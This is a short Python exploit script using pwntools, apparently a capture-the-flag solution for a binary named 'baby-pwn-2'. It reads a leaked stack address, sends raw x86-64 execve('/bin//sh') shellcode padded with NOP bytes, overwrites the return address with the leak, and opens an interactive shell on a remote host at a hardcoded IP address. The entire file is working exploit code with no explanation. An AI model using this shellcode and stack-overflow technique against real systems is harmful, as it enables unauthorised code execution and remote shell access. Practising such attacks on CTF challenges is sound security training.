#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./baby-pwn-2')

p = process()
p = remote('34.162.119.16', 5000)
p.recvuntil(b'Stack address leak: ')
leak = int(p.recvline()[:-1],16)
print(hex(leak))
input()
#shellcode = asm(shellcraft.sh())
payload = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

payload = payload.ljust(0x40,b'\x90')
p.sendlineafter(b'Enter some text: ',payload +  p64(0) + p64(leak))

p.interactive()
